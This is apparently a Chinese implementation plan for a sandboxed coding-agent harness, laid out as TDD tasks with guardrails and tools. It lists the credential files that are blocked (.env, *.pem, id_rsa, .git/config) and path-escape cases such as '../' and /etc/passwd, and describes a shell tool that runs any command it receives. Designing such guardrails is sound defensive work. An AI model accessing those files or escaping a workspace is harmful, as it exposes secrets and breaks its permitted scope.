# SafeCode Harness — 实现计划

> **面向 agentic workers：** 必须子技能：使用 superpowers:subagent-driven-development（推荐）或 superpowers:executing-plans 按任务逐个实现本计划。步骤使用 checkbox (`- [ ]`) 语法追踪。

**目标：** 实现一个受控的 Coding Agent 执行框架（SafeCode Harness），连接真实 LLM（通过 OpenAI 兼容 API）与受限代码工作区，具备确定性护栏、测试反馈闭环和上下文管理——所有机制均可通过 mock LLM 单元测试验证。

**架构：** 管道架构：Context Builder → LLM → Action Parser → Guardrail → Tool Dispatcher → Tool Executor。CLI（Typer）和 WebUI（FastAPI + Jinja2）作为入口。RealLLM 用于主执行路径，MockLLM 用于确定性验证。

**技术栈：** Python 3.10+、Typer、FastAPI + uvicorn、Jinja2、pytest、PyYAML、keyring、Docker、OpenAI 兼容 API

## 全局约束

- Python >= 3.10
- 不得使用 LangChain AgentExecutor、AutoGen、CrewAI、LlamaIndex agent 或任何现成 agent runner 作为 harness 内核
- 所有 harness 核心机制必须能在 mock LLM 下通过确定性单元测试验证（无网络、无真实 LLM）
- TDD 严格执行：先写失败测试 → 实现 → 重构
- API Key 不得出现在代码、配置文件、日志、git 历史或测试输出中
- 每个 task 完成一次 commit，附带描述性消息
- SPEC.md 是需求的唯一来源，不扩展范围

---

## Phase 0：工程初始化

### Task 0.1：Python 项目脚手架 （已完成 feat: complete task 0.1 project initialization）

### Goal
初始化 Python 项目结构，包括依赖管理、pytest 配置和 `safecode` 包骨架。

### Files
- 创建：`pyproject.toml`
- 创建：`safecode/__init__.py`
- 创建：`safecode/cli/__init__.py`
- 创建：`safecode/cli/main.py`
- 创建：`safecode/models/__init__.py`
- 创建：`tests/__init__.py`
- 创建：`tests/conftest.py`
- 创建：`pytest.ini`（或写入 `pyproject.toml`）

### Interfaces
- **包**：`safecode` — 根包，版本号定义在 `pyproject.toml`
- **子包**：`safecode.models` — 数据模型（Pydantic/dataclasses）
- **测试根目录**：`tests/` — 镜像 `safecode/` 结构

### Implementation Notes
- `pyproject.toml` 必须声明依赖：`typer`、`fastapi`、`uvicorn`、`jinja2`、`pydantic`、`pyyaml`、`keyring`、`httpx`、`pytest`、`pytest-cov`、`pytest-mock`
- 入口点：`safecode` CLI 通过 `[project.scripts]` 指向 `safecode.cli:app`
- `conftest.py` 必须提供 fixture `tmp_workspace`：创建临时目录（含示例文件），测试后清理
- `.gitignore` 已覆盖 Python 产物、密钥、IDE 文件；确认是否充分
- 包必须可通过 `pip install -e .` 安装
- CLI 初始阶段只提供最小入口，用于验证项目安装和命令启动。具体命令功能在后续 CLI 阶段实现。

### Tests
- **test_package_imports.py**：验证 `safecode` 及其子包的导入正常
- **test_cli_entry.py**：验证 `safecode --help` 退出码为 0 并打印帮助文本

### Dependencies
Depends on：（无——这是第一个任务）

Can run in parallel with：（无）

---

### Task 0.2：GitLab CI 配置 （已完成 ci: add gitlab unit test pipeline）

### Goal
配置 `.gitlab-ci.yml`，包含 `unit-test` job，每次 push 时运行 pytest。

### Files
- 创建：`.gitlab-ci.yml`

### Interfaces
- **CI Job**：`unit-test` — 在 Python 3.10+ 环境中运行 `pytest --cov=safecode --cov-report=term`
- **产物**：测试报告和覆盖率数据，供审查

### Implementation Notes
- 使用 `python:3.10`（或 `3.11`）Docker 镜像
- 通过 `pip install -e .[dev]` 安装依赖
- job 在任何测试失败时必须失败
- 将 `coverage` 报告作为 job 产物
- 在 main 分支上，额外运行 `pytest --cov=safecode --cov-report=term --cov-fail-under=80`

### Tests
- CI 通过首次 push 自行验证；当 `unit-test` job 在 GitLab CI 中显示绿色即完成

### Dependencies
Depends on：Task 0.1

Can run in parallel with：（无——必须先有项目脚手架）

---

### Task 0.3：Docker 基础配置 （已完成 build: add docker base image）

### Goal
创建最小化 `Dockerfile`，构建项目环境，后续扩展 WebUI 和 demo 配置。

### Files
- 创建：`Dockerfile`
- 创建：`.dockerignore`

### Interfaces
- **Dockerfile**：单阶段构建；安装 Python 3.10+，复制源码，`pip install -e .` 安装
- **`.dockerignore`**：排除 `.git`、`__pycache__`、`.venv`、`.pytest_cache`、`.env*`、`*.key`、`*.pem`

### Implementation Notes
- 基础镜像：`python:3.10-slim`
- 非 root 用户：创建 `safecode` 用户，以该用户身份运行
- 默认命令：暂时仅为 `safecode --help`；Phase 8 中更新
- 镜像大小目标：< 500MB
- 暴露端口 8000（供后续 WebUI 使用）

### Tests
- `docker build -t safecode-harness .` 必须成功
- `docker run --rm safecode-harness` 必须打印帮助文本并退出码为 0

### Dependencies
Depends on：Task 0.1

Can run in parallel with：Task 0.2

---

## Phase 1：Harness 核心框架

### Task 1.1：数据模型——核心类型 （已完成 feat: implement core data models）

### Goal
定义 harness 中使用的所有核心数据结构（dataclasses/Pydantic 模型）：`ParsedAction`、`ToolResult`、`GuardrailEvent`、`TestFeedback`、`ContextPayload`、`SessionStatus`、`SessionStep`、`Session`、`TaskConfig`、`RuntimeConfig`。

### Files
- 创建：`safecode/models/action.py`
- 创建：`safecode/models/tool_result.py`
- 创建：`safecode/models/guardrail.py`
- 创建：`safecode/models/test_feedback.py`
- 创建：`safecode/models/context.py`
- 创建：`safecode/models/session.py`
- 创建：`safecode/models/task_config.py`
- 创建：`safecode/models/runtime_config.py`
- 修改：`safecode/models/__init__.py`（重新导出所有模型）

### Interfaces
- **ParsedAction**（`action.py`）：`tool: str`、`params: dict`、`thought_summary: Optional[str]`
- **ToolResult**（`tool_result.py`）：`tool: str`、`success: bool`、`data: Optional[dict]`、`error: Optional[str]`、`duration_ms: int`
- **GuardrailEvent**（`guardrail.py`）：`blocked: bool`（存在时始终为 True）、`reason: str`（枚举值：`dangerous_shell_command | path_outside_workspace | sensitive_file_access`）、`tool: str`、`action_summary: str`、`recoverable: bool`、`suggestion: Optional[str]`
- **TestFeedback**（`test_feedback.py`）：`exit_code: int`、`passed_count: int`、`failed_count: int`、`skipped_count: int`、`duration_ms: int`、`status: str`（passed/failed/error/timeout）、`failed_tests: list[FailedTest]`、`previous_failed_count: Optional[int]`、`fixed_tests: list[str]`、`new_failures: list[str]`、`unchanged_failures: list[str]`、`progress_summary: str`、`hint: Optional[str]`
  - **FailedTest**：`name: str`、`assertion: Optional[str]`、`traceback: Optional[str]`、`file_path: Optional[str]`、`line_number: Optional[int]`
- **ContextPayload**（`context.py`）：`system_prompt: str`、`task_description: str`、`last_test_feedback: Optional[TestFeedback]`、`last_tool_result: Optional[ToolResult]`、`last_guardrail_event: Optional[GuardrailEvent]`、`recent_diffs: list[str]`、`workspace_tree: Optional[str]`、`history_summary: Optional[str]`、`step_id: int`、`blocked_count: int`、`remaining_steps: int`
- **SessionStatus**（`session.py`）：枚举：`RUNNING, SUCCESS, MAX_ITERATIONS_REACHED, TERMINATED_BY_GUARDRAIL, TIMEOUT, FINISHED_WITHOUT_PASSING_TESTS, INVALID_ACTION_LIMIT_REACHED`
- **SessionStep**（`session.py`）：`step_id: int`、`llm_request: ContextPayload`、`llm_response: str`、`parsed_action: Optional[ParsedAction]`、`guardrail_result: Optional[GuardrailEvent]`、`tool_result: Optional[ToolResult]`、`test_feedback: Optional[TestFeedback]`、`timestamp: datetime`
- **Session**（`session.py`）：`session_id: str`（UUID）、`task_config: TaskConfig`、`workspace_root: Path`、`steps: list[SessionStep]`、`blocked_count: int`、`invalid_action_count: int`、`start_time: datetime`、`end_time: Optional[datetime]`、`final_status: SessionStatus`、`llm_backend: str`（real/mock）
- **TaskConfig**（`task_config.py`）：包含 `task.yaml` 模式（SPEC §6.1）中的所有字段
- **RuntimeConfig**（`runtime_config.py`）：`base_url: str`、`model: str`、`temperature: float`、`max_iterations: int`、`timeout_seconds: int`、`test_command: str`、`context_budget_chars: int`、`guardrail_threshold: int`、`shell_allowlist: list[str]`

### Implementation Notes
- 所有模型使用 `@dataclass`（或 Pydantic `BaseModel`，如需验证）
- `TaskConfig` 需要 `from_yaml(cls, path: Path) -> TaskConfig` 类方法
- `SessionStatus` 为 `str, Enum`
- 所有模型必须可 JSON 序列化（添加 `to_dict()` / `from_dict()` 方法或使用 `dataclasses.asdict`）
- `GuardrailEvent` 仅以 `blocked=True` 实例化；未拦截的通过事件用 `None` 表示
- `SessionStep` 为只追加模式；创建后字段不可变

### Tests
- **test_models_action.py**：验证 `ParsedAction` 的必填/可选字段创建
- **test_models_tool_result.py**：验证成功和错误情况下的 `ToolResult` 创建
- **test_models_guardrail.py**：验证三种 reason 类型的 `GuardrailEvent` 创建
- **test_models_session.py**：验证 `Session` 初始化、`SessionStatus` 枚举值、`SessionStep` 结构
- **test_models_task_config.py**：验证 `TaskConfig.from_yaml()` 对有效和无效 YAML 的处理
- **test_models_context.py**：验证 `ContextPayload` 在所有可选字段为 None 时的创建

### Dependencies
Depends on：Task 0.1

Can run in parallel with：Task 0.2、Task 0.3

---

### Task 1.2：LLM Backend 接口 （已完成 feat: implement llm backend interface）

### Goal
定义 `LLMBackend` 抽象基类，`RealLLM` 和 `MockLLM` 均实现该接口，方法为 `query(context: ContextPayload) -> str`。

### Files
- 创建：`safecode/llm/__init__.py`
- 创建：`safecode/llm/backend.py`

### Interfaces
- **LLMBackend**（ABC）：抽象类，方法 `query(self, context: ContextPayload) -> str`
  - 接收 `ContextPayload`，返回原始 LLM 响应字符串
  - 子类必须实现此方法
- 模块 `safecode/llm/__init__.py` 导出 `LLMBackend`

### Implementation Notes
- 使用 `abc.ABC` 和 `@abstractmethod`
- `query` 方法签名是所有 LLM 后端的契约
- 此处不写实现逻辑——仅定义接口
- 错误处理：子类在失败时抛出 `LLMError`（自定义异常）；超时抛出 `LLMTimeoutError`

### Tests
- **test_llm_backend.py**：验证 `LLMBackend` 不能直接实例化（抛出 `TypeError`）；验证具体子类可实例化且 `query` 返回预期字符串

### Dependencies
Depends on：Task 1.1（需要 `ContextPayload`）

Can run in parallel with：（无——所有 LLM 任务的基础）

---

### Task 1.3：Action Parser （已完成 feat: implement action parser）

### Goal
实现 `ActionParser`，将原始 LLM 响应字符串解析为 `ParsedAction`，或抛出带具体原因的 `InvalidActionError`。

### Files
- 创建：`safecode/core/__init__.py`
- 创建：`safecode/core/action_parser.py`
- 创建：`safecode/core/exceptions.py`

### Interfaces
- **ActionParser**：类，方法 `parse(self, response: str) -> ParsedAction`
- **InvalidActionError**（异常）：`reason: str` — 取值为 `invalid_json | missing_fields | unknown_tool | invalid_params`
- **TOOL_SCHEMAS**：字典，将工具名映射到所需参数 schema，用于验证
  - `list_files`：`{"path": str, "recursive": Optional[bool]}`
  - `read_file`：`{"path": str, "start_line": Optional[int], "end_line": Optional[int]}`
  - `search_content`：`{"pattern": str, "path": Optional[str], "file_pattern": Optional[str]}`
  - `write_file`：`{"path": str, "content": str}`
  - `edit_file`：`{"path": str, "old_text": str, "new_text": str}`
  - `run_tests`：`{"args": Optional[str]}`（可选的额外 pytest 参数）
  - `run_shell`：`{"command": str}`
  - `finish`：`{"summary": Optional[str]}`

### Implementation Notes
- 使用 `json.loads` 解析 JSON；捕获 `json.JSONDecodeError` → `InvalidActionError(reason="invalid_json")`
- 检查 `tool` 和 `params` 键 → `InvalidActionError(reason="missing_fields")`
- 验证 `tool` 是否在 `TOOL_SCHEMAS` 键中 → `InvalidActionError(reason="unknown_tool")`
- 验证 `params` 是否符合对应 schema → `InvalidActionError(reason="invalid_params")`
- `thought_summary` 为可选字段，不验证
- 解析器必须处理 LLM 响应中可能包含的 markdown 代码块标记（```json ... ```）——先剥离再解析
- 边界情况：空响应字符串 → `InvalidActionError(reason="invalid_json")`

### Tests
- **test_action_parser_valid.py**：每种工具的有效 JSON → 正确的 `ParsedAction`；含 markdown 代码块的 LLM 响应 → 正确剥离
- **test_action_parser_invalid.py**：非 JSON → `invalid_json`；缺少 `tool` → `missing_fields`；未知工具 → `unknown_tool`；缺少必填参数 → `invalid_params`；错误参数类型 → `invalid_params`
- **test_action_parser_optional.py**：`thought_summary` 存在/不存在；可选参数存在/不存在

### Dependencies
Depends on：Task 1.1（需要 `ParsedAction`）

Can run in parallel with：Task 1.2

---

### Task 1.4：Stop Controller （已完成 feat: implement stop controller）

### Goal
实现 `StopController`，根据所有停止条件评估 `Session` 状态，返回相应的 `SessionStatus`。

### Files
- 创建：`safecode/core/stop_controller.py`

### Interfaces
- **StopController**：类，方法 `should_stop(self, session: Session, config: RuntimeConfig) -> tuple[bool, SessionStatus]`
  - 任一停止条件满足时返回 `(True, status)`，否则返回 `(False, RUNNING)`
- **停止条件检查**（按顺序）：
  1. `run_tests` 返回 `exit_code=0` 且 `status=passed` → `(True, SUCCESS)`
  2. `step_id >= max_iterations` → `(True, MAX_ITERATIONS_REACHED)`
  3. `blocked_count >= guardrail_threshold` → `(True, TERMINATED_BY_GUARDRAIL)`
  4. 会话耗时 >= `timeout_seconds` → `(True, TIMEOUT)`
  5. LLM 返回 `finish` 动作且测试已通过 → `(True, SUCCESS)`
  6. LLM 返回 `finish` 动作但测试未通过 → `(True, FINISHED_WITHOUT_PASSING_TESTS)`
  7. `invalid_action_count >= 3` → `(True, INVALID_ACTION_LIMIT_REACHED)`

### Implementation Notes
- 按指定顺序检查条件；第一个匹配即生效
- 条件 1：检查最后一步的 `test_feedback` 中 `status == "passed"` 且 `exit_code == 0`
- 条件 2：比较 `len(session.steps)` 与 `config.max_iterations`
- 条件 3：比较 `session.blocked_count` 与 `config.guardrail_threshold`
- 条件 4：计算 `datetime.now() - session.start_time` 并与 `config.timeout_seconds` 比较
- 条件 5-6：检查最后一步的 `parsed_action.tool == "finish"` 和测试状态
- 边界情况：空 session（无步骤）→ `(False, RUNNING)`

### Tests
- **test_stop_controller_success.py**：测试通过 → `(True, SUCCESS)`；LLM finish 且测试通过 → `(True, SUCCESS)`
- **test_stop_controller_max_iterations.py**：`step_id >= max_iterations` → `(True, MAX_ITERATIONS_REACHED)`
- **test_stop_controller_guardrail.py**：`blocked_count >= 3` → `(True, TERMINATED_BY_GUARDRAIL)`
- **test_stop_controller_timeout.py**：耗时 > timeout → `(True, TIMEOUT)`
- **test_stop_controller_finish_no_pass.py**：LLM finish 但测试失败 → `(True, FINISHED_WITHOUT_PASSING_TESTS)`
- **test_stop_controller_invalid_actions.py**：`invalid_action_count >= 3` → `(True, INVALID_ACTION_LIMIT_REACHED)`
- **test_stop_controller_running.py**：正常进行中的 session → `(False, RUNNING)`

### Dependencies
Depends on：Task 1.1（需要 `Session`、`SessionStatus`、`RuntimeConfig`）

Can run in parallel with：Task 1.3

---

### Task 1.5：Workspace Manager

### Goal
实现 `WorkspaceManager`，将工作区模板复制到临时目录并管理清理。

### Files
- 创建：`safecode/core/workspace_manager.py`

### Interfaces
- **WorkspaceManager**：类，方法：
  - `setup(self, template_path: Path, keep: bool = False) -> Path`：将模板复制到 `/tmp/safecode-session-{uuid}`，返回 `workspace_root`
  - `cleanup(self)`：移除临时工作区目录（除非 `keep=True`）
  - `workspace_root: Path` 属性

### Implementation Notes
- 使用 `shutil.copytree` 将模板复制到临时目录
- 通过 `uuid.uuid4()` 生成 UUID
- 临时目录路径：`/tmp/safecode-session-{uuid}`（Windows 上使用 `%TEMP%` 等效路径）
- `cleanup` 使用 `shutil.rmtree` 并包含错误处理（已删除则忽略）
- 通过 `atexit` 或上下文管理器（`__enter__`/`__exit__`）注册清理
- 边界情况：模板路径不存在 → `FileNotFoundError`；磁盘空间不足 → `OSError`；复制权限不足 → `PermissionError`

### Tests
- **test_workspace_manager_setup.py**：setup 创建临时目录并复制文件；验证内容与模板匹配
- **test_workspace_manager_cleanup.py**：cleanup 删除临时目录；`keep=True` 时保留目录
- **test_workspace_manager_errors.py**：模板未找到时抛出 `FileNotFoundError`

### Dependencies
Depends on：（无——仅使用标准库）

Can run in parallel with：Task 1.3、Task 1.4

---

### Task 1.6：Agent Loop

### Goal
实现主循环 `AgentLoop`，编排完整管道：Context Builder → LLM → Action Parser → Guardrail → Tool Dispatcher → Stop Controller，迭代直到满足停止条件。

### Files
- 创建：`safecode/core/agent_loop.py`

### Interfaces
- **AgentLoop**：类，方法 `run(self, session: Session, llm_backend: LLMBackend, config: RuntimeConfig) -> Session`
  - 接收初始 `Session`、`LLMBackend` 和 `RuntimeConfig`
  - 返回已填充所有步骤并设置 `final_status` 的 `Session`
- **每轮迭代的管道步骤**：
  1. 调用 `StopController.should_stop(session, config)` → 若为 True，设置 `session.final_status` 并返回
  2. 调用 `ContextBuilder.build(session, config)` → 获取 `ContextPayload`
  3. 调用 `llm_backend.query(context)` → 获取原始响应字符串
  4. 调用 `ActionParser.parse(response)` → 获取 `ParsedAction` 或捕获 `InvalidActionError`
  5. 若解析失败：递增 `invalid_action_count`，创建含错误信息的 `SessionStep`，继续
  6. 调用 `Guardrail.check(action, session)` → 获取 `GuardrailEvent` 或 `None`
  7. 若被拦截：递增 `blocked_count`，创建含护栏事件的 `SessionStep`，继续
  8. 调用 `ToolDispatcher.dispatch(action, session)` → 获取 `ToolResult`
  9. 若工具为 `run_tests`：调用 `TestFeedbackSummarizer.summarize(result, session)` → 获取 `TestFeedback`
  10. 创建包含所有填充字段的 `SessionStep`，追加到 `session.steps`
  11. 递增 `step_id`，回到步骤 1

### Implementation Notes
- 本任务为**骨架**实现——ContextBuilder、Guardrail、ToolDispatcher、TestFeedbackSummarizer 均使用 stub（返回符合接口约定的 dummy 值）
- 每个 stub 必须符合后续任务定义的接口契约
- 循环处理解析器抛出的 `InvalidActionError`：创建 `SessionStep`，`parsed_action=None`，错误信息写入 `tool_result.error`
- 循环处理护栏拦截：创建 `SessionStep`，`guardrail_result` 已填充，`tool_result=None`
- 循环处理 `invalid_action_count >= 3` → Stop Controller 会捕获此条件
- 超时由 Stop Controller 在每轮迭代开始时检查
- 边界情况：空 LLM 响应 → 解析错误 → 递增 invalid_action_count
- 边界情况：LLM 后端抛出 `LLMError` → 在 step 中记录错误，继续（或根据配置停止）

### Tests
- **test_agent_loop_basic.py**：使用返回固定动作序列的 stub `LLMBackend`，验证循环运行正确迭代次数并填充 `session.steps`
- **test_agent_loop_stop_on_success.py**：Mock LLM 在测试通过后返回 `finish` → `final_status = SUCCESS`
- **test_agent_loop_stop_on_max_iterations.py**：`max_iterations=2`，循环运行 2 轮 → `final_status = MAX_ITERATIONS_REACHED`
- **test_agent_loop_stop_on_guardrail.py**：Mock LLM 返回危险动作 → `blocked_count` 达到 3 → `final_status = TERMINATED_BY_GUARDRAIL`
- **test_agent_loop_invalid_actions.py**：Mock LLM 返回 3 次非法 JSON → `final_status = INVALID_ACTION_LIMIT_REACHED`
- **test_agent_loop_session_step_structure.py**：`session.steps` 中每步具有正确的 `step_id`、`timestamp` 和填充字段

### Dependencies
Depends on：Task 1.1、Task 1.2、Task 1.3、Task 1.4、Task 1.5

Can run in parallel with：（无——集成所有 Phase 1 模块）

---

## Phase 2：工具系统

### Task 2.1：Tool 基类和 Dispatcher

### Goal
定义 `Tool` 抽象基类和 `ToolDispatcher`，将 `ParsedAction` 路由到正确的工具实现。

### Files
- 创建：`safecode/tools/__init__.py`
- 创建：`safecode/tools/base.py`
- 创建：`safecode/tools/dispatcher.py`

### Interfaces
- **Tool**（ABC）：抽象基类，定义：
  - `name: str`（类属性）
  - `execute(self, params: dict, session: Session) -> ToolResult`（抽象方法）
  - `validate_params(self, params: dict) -> None`（无效时抛出 `ValueError`）
- **ToolDispatcher**：类，定义：
  - `__init__(self, tools: list[Tool])`：注册工具
  - `dispatch(self, action: ParsedAction, session: Session) -> ToolResult`：按名称查找工具，调用 `execute`，返回 `ToolResult`
  - `registered_tools: dict[str, Tool]`（属性）

### Implementation Notes
- `ToolDispatcher.dispatch` 在 `registered_tools` 字典中查找 `action.tool`
- 若工具未找到：返回 `ToolResult(success=False, error=f"Unknown tool: {action.tool}")`
- 若工具抛出异常：捕获，返回 `ToolResult(success=False, error=str(e))`
- 通过计时 `execute` 调用来记录 `duration_ms`
- dispatcher 不执行护栏检查——这是 Guardrail 的职责（Phase 3）
- 每个工具在 `execute` 中自行处理参数验证

### Tests
- **test_tool_base.py**：验证 `Tool` 为抽象类；具体子类可正常工作
- **test_tool_dispatcher.py**：注册工具，分发到正确工具，验证 `ToolResult`；分发到未知工具 → 错误；验证 `duration_ms` 被测量

### Dependencies
Depends on：Task 1.1（需要 `ParsedAction`、`ToolResult`、`Session`）

Can run in parallel with：（无——所有工具实现的基础）

---

### Task 2.2：文件系统工具——list_files、read_file、search_content

### Goal
实现三个只读文件系统工具：`list_files`、`read_file`、`search_content`。

### Files
- 创建：`safecode/tools/list_files.py`
- 创建：`safecode/tools/read_file.py`
- 创建：`safecode/tools/search_content.py`

### Interfaces
- **ListFilesTool**（`list_files.py`）：
  - `name = "list_files"`
  - `execute(params, session) -> ToolResult`：列出 `params["path"]`（相对于 `session.workspace_root`）下的目录结构，默认递归；忽略 `.git`、`.venv`、`__pycache__`、`.pytest_cache`
  - 输出：`ToolResult.data = {"tree": "...", "files": ["path1", "path2", ...]}`
- **ReadFileTool**（`read_file.py`）：
  - `name = "read_file"`
  - `execute(params, session) -> ToolResult`：读取 `params["path"]`（相对于 workspace root）的文件内容；可选 `start_line`/`end_line` 进行切片
  - 单次读取大小限制：施加合理上限（如 100KB 或 config 中的 `context_budget_chars`）
  - 输出：`ToolResult.data = {"content": "...", "path": "...", "lines": int}`
- **SearchContentTool**（`search_content.py`）：
  - `name = "search_content"`
  - `execute(params, session) -> ToolResult`：在工作区中搜索 `params["pattern"]`；可选限制在 `params["path"]` 子目录和 `params["file_pattern"]` glob 范围内
  - 使用简单正则匹配（最小实现不支持 lookahead/lookbehind）
  - 输出：`ToolResult.data = {"matches": [{"file": str, "line": int, "content": str}, ...], "count": int}`

### Implementation Notes
- 所有路径相对于 `session.workspace_root` 解析；由 Phase 3 的 Guardrail 强制执行，但工具内部也应安全解析路径
- `list_files` 使用 `os.walk` 或 `pathlib.Path.rglob`；过滤掉忽略的目录
- `read_file` 以文本方式打开文件（UTF-8）；对二进制文件优雅处理（`UnicodeDecodeError` → error）
- `search_content` 逐行读取文件，对每行应用 `re.search(pattern, line)`；跳过二进制文件
- 边界情况：路径不存在 → error；`read_file` 的路径是目录 → error；`list_files` 空目录 → 空树；`search_content` 无匹配 → 空匹配列表

### Tests
- **test_list_files.py**：列出空目录、有文件的目录、嵌套目录；忽略 `.git`/`__pycache__`；不存在的路径 → error
- **test_read_file.py**：读取文件内容，按行范围读取；文件未找到 → error；二进制文件 → error
- **test_search_content.py**：找到匹配、无匹配、正则模式；限制子目录搜索；限制文件模式搜索

### Dependencies
Depends on：Task 2.1（需要 `Tool` 基类）

Can run in parallel with：Task 2.3

---

### Task 2.3：文件修改工具——write_file、edit_file

### Goal
实现两个文件修改工具：`write_file` 和 `edit_file`。

### Files
- 创建：`safecode/tools/write_file.py`
- 创建：`safecode/tools/edit_file.py`

### Interfaces
- **WriteFileTool**（`write_file.py`）：
  - `name = "write_file"`
  - `execute(params, session) -> ToolResult`：在 `params["path"]` 创建或覆盖文件，内容为 `params["content"]`；需要时创建父目录
  - 输出：`ToolResult.data = {"path": str, "bytes_written": int}`
- **EditFileTool**（`edit_file.py`）：
  - `name = "edit_file"`
  - `execute(params, session) -> ToolResult`：在 `params["path"]` 文件中查找 `params["old_text"]`，替换为 `params["new_text"]`；若 `old_text` 未找到或找到多次则失败
  - 输出：`ToolResult.data = {"path": str, "replaced": True}`

### Implementation Notes
- `write_file`：使用 `os.makedirs(parent, exist_ok=True)` 创建父目录；以 UTF-8 编码写入文件
- `edit_file`：读取整个文件，查找 `old_text`；若 count == 0 → error "text not found"；若 count > 1 → error "text found multiple times, must be unique"；若 count == 1 → 替换并写回
- `edit_file` 使用精确字符串匹配（最小实现不支持模糊/空白容错）
- 两个工具均以 `session.workspace_root` 为基础路径
- 边界情况：`write_file` 空内容 → 创建空文件；`edit_file` 空 `old_text` → error；`edit_file` 文件不存在 → error

### Tests
- **test_write_file.py**：创建新文件，覆盖已有文件，创建父目录；写入空内容；相对路径解析
- **test_edit_file.py**：替换文件中的文本，文本未找到 → error，文本找到多次 → error；编辑不存在的文件 → error；空 old_text → error

### Dependencies
Depends on：Task 2.1（需要 `Tool` 基类）

Can run in parallel with：Task 2.2

---

### Task 2.4：测试执行工具——run_tests

### Goal
实现 `run_tests` 工具，在工作区中执行 pytest 并返回结构化结果。

### Files
- 创建：`safecode/tools/run_tests.py`

### Interfaces
- **RunTestsTool**（`run_tests.py`）：
  - `name = "run_tests"`
  - `execute(params, session) -> ToolResult`：在 `session.workspace_root` 中运行 `pytest`（或 `config.test_command`）；捕获 exit_code、stdout、stderr
  - 输出：`ToolResult.data = {"exit_code": int, "stdout": str, "stderr": str, "command": str}`
  - 超时：默认 60 秒

### Implementation Notes
- 使用 `subprocess.run`，参数 `cwd=session.workspace_root`、`capture_output=True`、`text=True`
- 应用 `timeout` 参数；超时 → `ToolResult(success=False, error="Test execution timed out")`
- 原始输出原样返回；TestFeedbackSummarizer（Phase 4）将解析为结构化反馈
- 默认命令：`pytest`（可通过 `config.test_command` 配置）；若提供 `params["args"]` 则追加
- 处理 pytest 未安装时的 `FileNotFoundError` → 清晰的错误信息
- 边界情况：`exit_code` 不在 {0, 1} 中 → 异常情况；记录但不视为错误

### Tests
- **test_run_tests.py**：对通过的测试套件运行 pytest → `exit_code=0`、`success=True`；对失败的测试套件运行 → `exit_code=1`、`success=True`（工具执行成功，即使测试失败）；pytest 未找到 → `success=False`；超时 → `success=False, error="...timeout..."`

### Dependencies
Depends on：Task 2.1（需要 `Tool` 基类）

Can run in parallel with：Task 2.3、Task 2.5

---

### Task 2.5：Shell 执行工具——run_shell

### Goal
实现 `run_shell` 工具，在工作区中执行 allowlist 中的命令。

### Files
- 创建：`safecode/tools/run_shell.py`

### Interfaces
- **RunShellTool**（`run_shell.py`）：
  - `name = "run_shell"`
  - `execute(params, session) -> ToolResult`：在 `session.workspace_root` 中执行 `params["command"]`；捕获 exit_code、stdout、stderr
  - 输出：`ToolResult.data = {"exit_code": int, "stdout": str, "stderr": str, "command": str}`
  - 超时：默认 30 秒

### Implementation Notes
- 使用 `subprocess.run`，参数 `cwd=session.workspace_root`、`capture_output=True`、`text=True`、`shell=True`
- **重要**：工具本身不强制执行 allowlist——这是 Guardrail 的职责（Phase 3）。工具执行收到的任何命令
- 超时：默认 30 秒
- 处理 `subprocess.TimeoutExpired` → `ToolResult(success=False, error="Command timed out")`
- Shell 执行本质上是危险的；工具 docstring 应注明护栏验证在上游进行

### Tests
- **test_run_shell.py**：执行 `echo hello` → `success=True`，stdout 包含 "hello"；在 git 仓库中执行 `git status` → `success=True`；无效命令 → `success=False`；超时 → `success=False` 并含超时错误

### Dependencies
Depends on：Task 2.1（需要 `Tool` 基类）

Can run in parallel with：Task 2.3、Task 2.4

---

### Task 2.6：工具注册与集成

### Goal
将全部 7 个工具接入 `ToolDispatcher`，验证端到端工具分发正常工作。

### Files
- 创建：`safecode/tools/registry.py`
- 修改：`safecode/tools/__init__.py`（导出所有工具和 `create_default_tools`）

### Interfaces
- **create_default_tools() -> list[Tool]**：工厂函数，实例化全部 7 个工具并以列表形式返回，供 `ToolDispatcher` 使用
- **DEFAULT_TOOLS**：列表包含：`ListFilesTool`、`ReadFileTool`、`SearchContentTool`、`WriteFileTool`、`EditFileTool`、`RunTestsTool`、`RunShellTool`

### Implementation Notes
- `registry.py` 提供 `create_default_tools()` 函数
- `__init__.py` 重新导出所有工具类和 `create_default_tools`
- 这是一个简单的组装任务，无复杂逻辑

### Tests
- **test_tool_registry.py**：`create_default_tools()` 返回恰好 7 个具有正确名称的工具；每个工具是 `Tool` 的子类
- **test_tool_integration.py**（集成测试）：用所有工具创建 `ToolDispatcher`，分发 `list_files` 动作 → 得到正确的 `ToolResult`；分发 `read_file` → 正确内容；分发 `run_shell` 执行 `echo test` → 正确输出

### Dependencies
Depends on：Task 2.1、Task 2.2、Task 2.3、Task 2.4、Task 2.5

Can run in parallel with：（无——集成所有工具）

---

## Phase 3：Guardrail（治理护栏）

### Task 3.1：Path Guardrail（路径护栏）

### Goal
实现 `PathGuard`，验证文件路径是否在工作区根目录内。

### Files
- 创建：`safecode/guardrail/__init__.py`
- 创建：`safecode/guardrail/path_guard.py`

### Interfaces
- **PathGuard**：类，方法 `check(self, path: str, workspace_root: Path) -> Optional[GuardrailEvent]`
  - 若路径在工作区外则返回 `GuardrailEvent`，安全则返回 `None`
  - `reason = "path_outside_workspace"`

### Implementation Notes
- 解析目标路径：`(workspace_root / path).resolve()`
- 解析工作区根目录：`workspace_root.resolve()`
- 检查解析后的目标路径是否以解析后的工作区根目录开头
- 拦截模式：`../` 逃逸、绝对路径（如 `/etc/passwd`）、指向工作区外的符号链接
- 边界情况：`path` 为 `None` 或空 → 视为安全（让工具自行处理）
- 边界情况：`workspace_root` 本身是符号链接 → 先解析

### Tests
- **test_path_guard.py**：工作区内的有效路径 → `None`；含 `../` 逃逸的路径 → `GuardrailEvent(reason="path_outside_workspace")`；绝对路径 → 拦截；工作区外的符号链接 → 拦截；嵌套的有效路径 → `None`；路径解析到工作区边界 → `None`（含边界）

### Dependencies
Depends on：Task 1.1（需要 `GuardrailEvent`）

Can run in parallel with：Task 3.2、Task 3.3

---

### Task 3.2：Sensitive File Guardrail（敏感文件护栏）

### Goal
实现 `SensitiveFileGuard`，拦截对敏感文件（`.env`、`*.key`、`*.pem`、`secrets.json`、`id_rsa`、`.git/config`）的访问。

### Files
- 创建：`safecode/guardrail/sensitive_file_guard.py`

### Interfaces
- **SensitiveFileGuard**：类，方法 `check(self, path: str) -> Optional[GuardrailEvent]`
  - 若路径匹配敏感文件模式则返回 `GuardrailEvent`，安全则返回 `None`
  - `reason = "sensitive_file_access"`

### Implementation Notes
